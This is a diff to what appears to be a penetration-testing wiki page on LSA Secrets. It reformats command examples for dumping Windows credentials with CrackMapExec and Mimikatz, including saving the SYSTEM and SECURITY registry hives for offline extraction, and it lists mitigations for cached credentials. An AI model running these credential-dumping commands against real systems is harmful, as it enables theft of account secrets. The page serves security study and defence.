@@ -8,17 +8,22 @@ description: Additional information on LSA Secrets
 
 Dumping LSA Secrets with CrackMapExec:
 
-`crackmapexec smb [HOST] -u [USER] -p [PASSWORD] --lsa`
+```bash
+crackmapexec smb [HOST] -u [USER] -p [PASSWORD] --lsa
+```
 
 Dumping LSA Secrets with Mimikatz:
 
-`lsadump::secrets`
+```bash
+lsadump::secrets
+```
 
 Dumping LSA Secrets manually and then reading them with Mimikatz
 
-`reg save HKLM\SYSTEM system & reg save HKLM\security security`
-
-`lsadump::secrets /system:c:\temp\system /security:c:\temp\security`
+```powershell
+reg save HKLM\SYSTEM system & reg save HKLM\security security
+lsadump::secrets /system:c:\temp\system /security:c:\temp\security
+```
 
 ### Mitigations
 
@@ -26,9 +31,10 @@ When researching LSA Secrets on [MITRE](https://attack.mitre.org/techniques/T100
 
 The following settings can be configured to remove cached domain credentials from LSA Secrets:
 
-`Cached credential set to 0 on server`
-
-`Cached credential set to 1 on workstation`
+```bash
+Cached credential set to 0 on servers
+Cached credential set to 1 on workstations
+```
 
 Additionally, when cleartext credentials are retrieved from LSA Secrets it is due to the credentials being stored for a service (E.g., creating a service with a custom user account). To mitigate this issue, avoid using a custom user account to create the service.&#x20;
 
